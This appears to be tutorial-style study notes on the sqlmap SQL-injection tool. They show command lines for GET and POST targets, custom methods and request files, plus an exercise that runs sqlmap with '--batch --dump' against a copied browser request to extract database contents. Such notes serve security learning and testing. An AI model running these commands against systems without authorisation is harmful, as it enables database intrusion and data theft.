```bash
# Shows all options
sqlmap -hh
```

### Get/Post/Request
```bash
# Get Request is a -u / --url
sqlmap -u 'http://IP/page.php?id=5' --batch

# A Post is --data
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'

# Requesting files can be done with a -r

```

### Custom SQLMap Request
```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

### Custom HTTP Request
```bash
cat req.txt
HTTP / HTTP/1.0
Host: www.example.com
{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}

# Then running
sqlmap -r req.txt
```

### Exercise
Going to the page the hitting F12 and going to the network tab. Copying the curl.
Going to the command line pasting this into the CLI and entering. Next running the following.
```bash
# Must be done to the POST 
sqlmap (content) --batch --dump

# Taking off the --insecure 
``